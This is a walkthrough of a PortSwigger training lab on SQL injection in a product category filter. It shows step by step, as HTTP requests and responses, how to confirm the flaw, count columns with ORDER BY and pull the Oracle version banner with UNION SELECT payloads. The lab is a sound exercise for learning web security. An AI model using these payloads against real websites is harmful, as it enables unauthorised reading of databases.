# Lab 07: SQL injection attack, querying the database type and version on Oracle

## Description

 This lab contains an [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability in the product category filter. You can use a `UNION` attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

---

## Solution

The product category filter is the `category` HTTP query parameter. We can confirm that it is vulnerable to SQL injection as the following request leads to an HTTP 500 error.

```http
GET /filter?category=Gifts' HTTP/1.1
Host: acfc1f8d1e9b23b980bf006f004800b5.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
```

```http
HTTP/1.1 500 Internal Server Error
Connection: close
Content-Length: 21

Internal Server Error
```

The goal of the exercise is to display the database version string on the web page. It appears that the resultant rows from the original `SELECT` query are rendered on the web page. Thus, we can attempt to leverage a `UNION` to add additional rows to the result of the original `SELECT` query, which will then be rendered on the web page.

The first step is to determine how many columns are being returned by the original `SELECT` query. Then we'll want to determine which of those columns is of type string, as the database version is likely a string as well and the types need to match for the `UNION` to work. Once the `UNION` is in place, we can iterate through the different syntaxes for each of the major database versions to figure out which will work and give us the desired output.

### Determining the number of columns

We'll use the incremental `ORDER BY` method to determine the number of columns in the resultant rows from the original `SELECT` query.

#### `ORDER BY 1` - Success

```http
GET /filter?category=Gifts'+ORDER+BY+1-- HTTP/1.1
Host: acfc1f8d1e9b23b980bf006f004800b5.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
```

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Connection: close
Content-Length: 8421
...
```

#### `ORDER BY 2` - Success

```http
GET /filter?category=Gifts'+ORDER+BY+2-- HTTP/1.1
Host: acfc1f8d1e9b23b980bf006f004800b5.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
```

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Connection: close
Content-Length: 8421
...
```

#### `ORDER BY 3` - Error

```http
GET /filter?category=Gifts'+ORDER+BY+3-- HTTP/1.1
Host: acfc1f8d1e9b23b980bf006f004800b5.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
```

```http
HTTP/1.1 500 Internal Server Error
Connection: close
Content-Length: 21

Internal Server Error
```

Ordering by column index 3 produces an HTTP 500 error, which indicates that there are only 2 columns in the resultant rows from the original `SELECT` query. 

### Determining the column data types

To determine the data type of the two columns, and to specifically determine whether either of them is type string, we can both analyze the ordering of the data items from the previous `ORDER BY` attempts in the web page and we can use the incremental `UNION SELECT NULL` method.

When we ordered the output by column index 1 above, it appeared to sort the data items by the product name, indicating that product name is likely in index 1. Product name is most probably a string, and thus we can conclude that column 1 is of data type string.

When we orered the output by column index 2 above, it appeared to sort the data items by the product description, indicating that the product description is likely index 2. Product description is most probably a string, and thus we can conclude that column 2 is of data type string.

Employing the incremental `UNION SELECT NULL` method confirms these findings.

That means either column will work in our `UNION` injection to display the database version string. We will use column 2, since its output is placed in a table data HTML tag in the web page, as opposed to a table header HTML tag, though we could do either.

### Determining database version

With the number of columns from the resultant rows of the original `SELECT` query and the fact that column 2 is of type string in hand, we are ready to execute our `UNION` attack. We will iterate through the version query syntax for all of the major database versions.

#### MySQL & MSSQL - Error

```http
GET /filter?category=Gifts'+UNION+SELECT+NULL,@@version-- HTTP/1.1
Host: acfc1f8d1e9b23b980bf006f004800b5.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
```

```http
HTTP/1.1 500 Internal Server Error
Connection: close
Content-Length: 21

Internal Server Error
```

#### PostgreSQL - Error

```http
GET /filter?category=Gifts'+UNION+SELECT+NULL,version()-- HTTP/1.1
Host: acfc1f8d1e9b23b980bf006f004800b5.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
```

```http
HTTP/1.1 500 Internal Server Error
Connection: close
Content-Length: 21

Internal Server Error
```

#### Oracle - Success

```http
GET /filter?category=Gifts'+UNION+SELECT+NULL,BANNER+FROM+v$version-- HTTP/1.1
Host: acfc1f8d1e9b23b980bf006f004800b5.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
```

```html
<tr>
	<td>CORE	11.2.0.2.0	Production</td>
</tr>
<tr>
	<td>NLSRTL Version 11.2.0.2.0 - Production</td>
</tr>
<tr>
	<td>Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production</td>
</tr>
<tr>
	<td>PL/SQL Release 11.2.0.2.0 - Production</td>
</tr>
<tr>
	<td>TNS for Linux: Version 11.2.0.2.0 - Production</td>
</tr>
```

Oracle's version query executed successfully, indicating `Oracle version 11g Express Edition Release 11.2.0.2.0`. Knowledge of the underlying database will prove very useful in further exploitation of this SQL injection vulnerability.

It's important to note that the reason the MySQL, MSSQL, and PostgreSQL version queries above didn't work wasn't primarily because the version query syntax was incorrect, but because Oracle requries all `UNION SELECT` queries to specify a target table using the `FROM` operator. Since those queries didn't specify a target table, they failed. However, had they specified a target table, they would have failed because the version query syntax was incorrect.

```sql
SELECT name, description FROM products WHERE category = 'Pets' UNION SELECT 'a',NULL#'
```